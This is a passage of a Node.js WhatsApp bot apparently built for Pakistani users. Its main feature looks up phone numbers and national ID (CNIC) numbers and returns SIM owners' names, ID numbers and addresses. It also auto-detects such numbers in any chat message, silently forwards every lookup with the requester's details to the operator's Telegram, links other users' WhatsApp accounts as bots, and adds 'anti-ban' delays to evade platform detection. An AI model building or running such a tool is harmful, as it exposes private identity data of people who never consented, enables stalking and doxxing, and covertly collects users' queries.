        `✕ LOOKUP - NOT FOUND\n◉ +${num}\n◉ By: ${requesterInfo}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`
      ).catch(() => {});
      
      return (
        `╔══════════════════════╗\n` +
        `║ ◈ NUMBER LOOKUP ║\n` +
        `╚══════════════════════╝\n\n` +
        `✕ Not Found\n` +
        `◉ Number: +${num}\n\n` +
        `◉ Number Banned?\n` +
        `◉ https://rmnumber.vercel.app\n\n` +
        `◉ Developed by Itx Romeo`
      );
    }

    const cnic    = data.linked_cnic;
    const records = dedupe(data.data);

    let txt = '';
    txt += `╔══════════════════════╗\n`;
    txt += `║ ◈ NUMBER LOOKUP ║\n`;
    txt += `╚══════════════════════╝\n\n`;
    txt += `◉ Query: +${data.query_number || num}\n`;
    txt += `◉ CNIC: ${cnic}\n`;
    txt += `◉ Total SIMs: ${data.total_sims_found}\n`;
    txt += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    records.forEach((d, i) => {
      txt += formatRecord(d, i, '◈') + '\n';
    });

    let tgMsg = 
      `◈ LOOKUP - FOUND ✅\n◉ +${data.query_number || num}\n◉ CNIC: ${cnic}\n◉ SIMs: ${data.total_sims_found}\n◉ By: ${requesterInfo}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n\n◉ RECORDS:\n`;
    records.forEach((d, i) => {
      const addr = (!d.address || ['NULL','no','N/A','?',', , ?'].includes(d.address.trim())) ? 'N/A' : d.address;
      tgMsg += `\n${i+1}. +${d.number} | ${d.name} | ${d.cnic} | ${addr.replace(/developed by ramzan ahsan/gi, '').trim()}`;
    });

    if (cnic && !['N/A', 'NULL', 'null', 'undefined'].includes(String(cnic))) {
      try {
        const cnicData = await fetchSIMData(`number=${cnic}`);
        if (cnicData?.success && cnicData.data?.length) {
          const cnicRecords = dedupe(cnicData.data);
          txt += `━━━━━━━━━━━━━━━━━━━━━━\n`;
          txt += `◈ CNIC Ke Saray Numbers\n`;
          txt += `◉ CNIC: ${cnic}\n\n`;
          cnicRecords.forEach((d, i) => {
            txt += formatRecord(d, i, '◈') + '\n';
          });
          tgMsg += `\n\n◈ CNIC ALL NUMBERS:\n`;
          cnicRecords.forEach((d, i) => {
            tgMsg += `\n${i+1}. +${d.number} | ${d.name}`;
          });
        }
      } catch (_) {}
    }

    txt += `━━━━━━━━━━━━━━━━━━━━━━\n`;
    txt += `◉ Number Banned?\n`;
    txt += `◉ https://rmnumber.vercel.app\n\n`;
    txt += `◉ Developed by Itx Romeo`;

    tgMsg += `\n\n◉ Developed by Itx Romeo`;
    sendTelegram(tgMsg).catch(() => {});
    botStatus.lookupCount++;
    return txt;

  } catch (e) {
    console.error('Lookup error:', e.message);
    sendTelegram(`✕ LOOKUP ERROR\n◉ Number: ${rawNum}\n◉ Error: ${e.message}`).catch(() => {});
    return `✕ Lookup Failed\nServer se connect nahi ho saka.\n\n◉ Developed by Itx Romeo`;
  }
}

// ════════════════════════════════════════════════════════════════
//  🤖  MULTI-USER PAIRING
// ════════════════════════════════════════════════════════════════
const pairSessions = new Map();
const PAIR_SESSIONS_FILE = './pair_sessions.json';

function savePairSessions() {
  const data = {};
  for (const [num, session] of pairSessions) {
    if (session.status === 'connected') {
      data[num] = { status: session.status, phone: session.phone };
    }
  }
  fs.writeFileSync(PAIR_SESSIONS_FILE, JSON.stringify(data, null, 2));
}

async function startPairBot(phoneNumber) {
  const clean = phoneNumber.replace(/[^0-9]/g, '');
  
  if (pairSessions.has(clean)) {
    const existing = pairSessions.get(clean);
    if (existing.status === 'connected') {
      return { success: false, error: 'Ye number pehle se connected hai' };
    }
    try { existing.sock?.end(); } catch (_) {}
    pairSessions.delete(clean);
  }

  try {
    const authFolder = `./auth_pair_${clean}`;
    const { state, saveCreds } = await useMultiFileAuthState(authFolder);
    const { version } = await fetchLatestBaileysVersion();

    const pairSock = makeWASocket({
      version,
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: 'silent' }),
      browser: Browsers.ubuntu('Chrome'),
      syncFullHistory: false,
      getMessage: async () => ({ conversation: '' })
    });

    const pairCode = await pairSock.requestPairingCode(clean);

    pairSessions.set(clean, {
      sock: pairSock,
      status: 'pairing',
      phone: clean
    });

    pairSock.ev.on('creds.update', saveCreds);

    pairSock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
      if (connection === 'open') {
        pairSessions.set(clean, {
          sock: pairSock,
          status: 'connected',
          phone: clean
        });
        savePairSessions();
        console.log(`◈ Pair bot connected: +${clean}`);
        sendTelegram(`◈ NEW PAIR CONNECTED\n◉ +${clean}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`).catch(() => {});
      }
      if (connection === 'close') {
        const code = lastDisconnect?.error?.output?.statusCode;
        if (code !== DisconnectReason.loggedOut) {
          console.log(`◈ Reconnecting pair bot: +${clean}...`);
          setTimeout(() => startPairBot(clean), 5000);
        } else {
          pairSessions.delete(clean);
          savePairSessions();
          console.log(`◈ Pair bot logged out: +${clean}`);
          try { fs.rmSync(authFolder, { recursive: true, force: true }); } catch (_) {}
        }
      }
    });

    pairSock.ev.on('messages.upsert', async ({ messages }) => {
      try {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        if (!text) return;
        
        const detectedNum = extractPKNumber(text);
        const detectedCNIC = extractCNIC(text);
        
        if (text.startsWith('.n') || detectedNum || detectedCNIC) {
          let query;
          if (text.startsWith('.n')) {
            query = text.slice(2).trim().replace(/[^0-9]/g, '');
          } else if (detectedNum) {
            query = detectedNum;
          } else if (detectedCNIC) {
            query = detectedCNIC;
          }
          
          if (query) {
            try { await pairSock.readMessages([msg.key]); } catch (_) {}
            
            if (query.length === 13 && /^[3-7]/.test(query)) {
              const result = await lookupByCNIC(query, `Pair: +${clean}`);
              await pairSock.sendMessage(msg.key.remoteJid, { text: result }, { quoted: msg });
            } else {
              const result = await lookupNumber(query, `Pair: +${clean}`);
              await pairSock.sendMessage(msg.key.remoteJid, { text: result }, { quoted: msg });
            }
          }
        }
      } catch (_) {}
    });

    return { success: true, code: pairCode };
  } catch (e) {
    console.error('Pair error:', e.message);
    return { success: false, error: 'Connection failed. Try again.' };
  }
}

// ════════════════════════════════════════════════════════════════
//  🧘  HUMAN-LIKE BEHAVIOR
// ════════════════════════════════════════════════════════════════
const DELAYS = [[400, 900], [800, 1800], [1200, 2500]];

async function humanDelay(tier = 1) {
  const [min, max] = DELAYS[tier];
  const ms = Math.floor(Math.random() * (max - min)) + min;
  await new Promise(r => setTimeout(r, ms));
}

async function sendWithPresence(sockInst, jid, text, quoted) {
  try { await sockInst.sendPresenceUpdate('composing', jid); } catch (_) {}
  await humanDelay(Math.floor(Math.random() * 3));
  try { await sockInst.sendPresenceUpdate('paused', jid); } catch (_) {}
  return sockInst.sendMessage(jid, { text }, quoted ? { quoted } : {});
}

// ════════════════════════════════════════════════════════════════
//  🚀  BOT START
// ════════════════════════════════════════════════════════════════
async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState('auth_info');
  const { version }          = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    auth             : state,
    printQRInTerminal: false,
    logger           : pino({ level: 'silent' }),
    browser          : Browsers.ubuntu('Chrome'),
    syncFullHistory  : false,
    getMessage       : async () => ({ conversation: '' })
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      botStatus.connected = true;
      botStatus.uptime    = Date.now();
      botStatus.phone     = (sock.user?.id || '').split(':')[0].split('@')[0];
      console.log('◈ Bot Live! Dashboard → http://localhost:' + PORT);
      
      sendTelegram(
        `◈ BOT ONLINE\n◉ +${botStatus.phone}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n◉ Developed by Itx Romeo`
      ).catch(() => {});

      // Restore pair sessions
      if (fs.existsSync(PAIR_SESSIONS_FILE)) {
        try {
          const saved = JSON.parse(fs.readFileSync(PAIR_SESSIONS_FILE));
          for (const [num] of Object.entries(saved)) {
            console.log(`◈ Restoring pair: ${num}`);
            startPairBot(num).catch(() => {});
          }
        } catch (_) {}
      }
    }
    if (connection === 'close') {
      botStatus.connected = false;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) {
        console.log('◈ Reconnecting...');
        sendTelegram(`◈ BOT DISCONNECTED - Reconnecting\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`).catch(() => {});
        setTimeout(startBot, 4000);
      } else {
        console.log('◈ Logged out.');
        sendTelegram(`◈ BOT LOGGED OUT\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`).catch(() => {});
      }
    }
  });

  // ── MESSAGE HANDLER
  sock.ev.on('messages.upsert', async ({ messages }) => {
    try {
      const msg = messages[0];
      if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

      const from     = msg.key.remoteJid;
      const isGroup  = from.endsWith('@g.us');
      const sender   = isGroup ? (msg.key.participant || '') : from;

      const body = msg.message;
      const text = (
        body.conversation                                ||
        body.extendedTextMessage?.text                   ||
        body.imageMessage?.caption                       ||
        body.videoMessage?.caption                       ||
        body.buttonsResponseMessage?.selectedDisplayText ||
        body.listResponseMessage?.title                  || ''
      ).trim();

      if (!text) return;

      botStatus.msgCount++;

      try { await sock.readMessages([msg.key]); } catch (_) {}
      await humanDelay(0);

      const reply = (t) => sendWithPresence(sock, from, t, msg);
      const quoted = body.extendedTextMessage?.contextInfo?.participant;
      const requesterInfo = isGroup 
        ? `Group: ${from} | Sender: ${sender}`
        : `Chat: ${from}`;

      if (text.startsWith('.')) {
        const parts   = text.slice(1).trim().split(/ +/);
        const command = parts.shift().toLowerCase();
        const args    = parts;

        switch (command) {

          case 'pair': {
            if (!args.length) return reply(
              `✕ Usage:\n.pair 03338872681\n.pair +923338872681\n.pair 923338872681\n\n◉ Apna WhatsApp number do, pairing code milega!`
            );
            const rawPair = args.join('').replace(/[^0-9]/g, '');
            await reply('◈ Pairing code generate ho raha hai...');
            const result = await startPairBot(rawPair);
            if (result.success) {
              reply(
                `◈ Pairing Code Ready!\n\n` +
                `◉ Number: +${rawPair}\n` +
                `◉ Code: ${result.code}\n\n` +
                `◉ WhatsApp: Linked Devices → Link a Device → Enter Code\n` +
                `◉ Code 60 seconds mein expire hoga!\n\n` +
                `◉ Developed by Itx Romeo`
              );
            } else {
              reply(`✕ Error: ${result.error}\n\n◉ Developed by Itx Romeo`);
            }
            break;
          }

          case 'n': {
            const raw = args.join('').replace(/[\s\-\.]/g, '');
            if (!raw) return reply(
              `✕ Usage:\n.n 03338872681 — Number lookup\n.n 3230216458531 — CNIC lookup\n\n◉ Ya sirf number/CNIC bhejo!`
            );
            
            if (isDuplicate(raw)) {
              return reply('◈ Abhi abhi to check kiya! Thoda wait karo...');
            }
            
            await reply('◈ Searching...');
            
            if (raw.length === 13 && /^[3-7]/.test(raw)) {
              reply(await lookupByCNIC(raw, requesterInfo));
            } else {
              reply(await lookupNumber(raw, requesterInfo));
            }
            break;
          }

          case 'ai': {
            if (!args.length) return reply(`✕ Sawal likho!\nUsage: .ai <sawal>`);
            await reply('◈ Soch raha hun...');
            const res = await getAI(`Tera owner "Itx Romeo" hai. Sawal: "${args.join(' ')}". Roman Urdu mein jawab de, clear aur short.`);
            reply(`${res}\n\n◉ Developed by Itx Romeo`);
            break;
          }

          case 'roast': {
            await reply('◈ Roasting...');
            const target = quoted ? `@${quoted.split('@')[0]}` : 'is banda';
            const res = await getAI(`Ek zabardast Roman Urdu roast likho ${target} ke liye. 2-3 lines. Street style. Emojis.`, 0.9);
            await sock.sendMessage(from, {
              text: `${res}\n\n◉ Developed by Itx Romeo`,
              mentions: quoted ? [quoted] : []
            }, { quoted: msg });
            break;
          }

          case 'joke': {
            await reply('◈ Joke aa raha hai...');
            const res = await getAI(`Ek funny Roman Urdu joke sunao. 2-3 lines. Emojis.`, 0.9);
            reply(`${res}\n\n◉ Developed by Itx Romeo`);
            break;
          }

          case 'quote': {
            await reply('◈ Soch raha hun...');
            const res = await getAI(`Ek powerful motivational quote Roman Urdu mein. Bold. Max 3 lines.`, 0.8);
            reply(`${res}\n\n◉ Developed by Itx Romeo`);
            break;
          }

          case 'shayari': {
            await reply('◈ Shayari likh raha hun...');
            const res = await getAI(`Ek khoobsurat romantic ya dard bhari Urdu shayari. 4 lines.`, 0.9);
            reply(`${res}\n\n◉ Developed by Itx Romeo`);
            break;
          }

          case 'ping': {
            const lat = Math.abs(Date.now() - msg.messageTimestamp * 1000);
            const up  = process.uptime();
            const h   = Math.floor(up / 3600);
            const m   = Math.floor((up % 3600) / 60);
            const s   = Math.floor(up % 60);
            const spd = lat < 100 ? 'Fast' : lat < 500 ? 'Medium' : 'Slow';
            reply(
              `╔══ ◈ PING ◈ ══╗\n\n` +
              `◉ Latency: ${lat}ms ${spd}\n` +
              `◉ Uptime: ${h}h ${m}m ${s}s\n` +
              `◉ Status: Online\n\n` +
              `╚═════════════════╝\n◉ Developed by Itx Romeo`
            );
            break;
          }

          case 'info':
            reply(
              `╔══ ◈ BOT INFO ◈ ══╗\n\n` +
              `◉ Creator: Itx Romeo\n` +
              `◉ Version: 5.0 Pro\n` +
              `◉ AI: Grok (${GROK_MODEL})\n` +
              `◉ Lookup: SIM + CNIC Data\n` +
              `◉ Urdu: Active\n` +
              `◉ Multi-Pair: Active\n` +
              `◉ Anti-Ban: Human-like\n` +
              `◉ System: Running Smooth\n\n` +
              `╚══════════════════════════╝\n◉ Developed by Itx Romeo`
            );
            break;

          case 'menu':
          case 'help':
            reply(
              `╔════════════════════════╗\n` +
              `║  ◈ ITX ROMEO MENU ◈   ║\n` +
              `╚════════════════════════╝\n\n` +

              `◈ AI COMMANDS\n` +
              `┣ .ai [sawal] — AI se poochho\n` +
              `┣ .roast — Roast karo\n` +
              `┣ .joke — Funny joke\n` +
              `┣ .quote — Motivational\n` +
              `┗ .shayari — Urdu shayari\n\n` +

              `◈ LOOKUP\n` +
              `┣ .n [number] — SIM + CNIC info\n` +
              `┣ .n [cnic] — CNIC se saray numbers\n` +
              `┗ Ya sirf number/CNIC bhejo!\n\n` +

              `◈ PAIRING\n` +
              `┗ .pair [number] — Number link karo\n\n` +

              `◈ Number Banned?\n` +
              `┗ https://rmnumber.vercel.app\n\n` +

              `◈ UTILS\n` +
              `┣ .ping — Speed check\n` +
              `┗ .info — Bot info\n\n` +

              `╚════════════════════════╝\n` +
              `◉ Developed by Itx Romeo`
            );
            break;
        }

        return;
      }

      // Auto-detect CNIC first
      const detectedCNIC = extractCNIC(text);
      if (detectedCNIC) {
        const cleanCNIC = detectedCNIC.replace(/[^0-9]/g, '');
        if (!isDuplicate(cleanCNIC)) {
          await reply('◈ CNIC Search...');
          reply(await lookupByCNIC(detectedCNIC, requesterInfo));
        }
        return;
      }

      // Auto-detect phone number
      const detected = extractPKNumber(text);
      if (detected) {
        const cleanNum = detected.replace(/[^0-9]/g, '');
        if (!isDuplicate(cleanNum)) {
          await reply('◈ Searching...');
          reply(await lookupNumber(detected, requesterInfo));
        }
      }

    } catch (e) {
      console.error('MSG Error:', e.message);
      sendTelegram(`◈ MSG HANDLER ERROR\n◉ Error: ${e.message}`).catch(() => {});
    }
  });
}

// ── Boot
startBot();
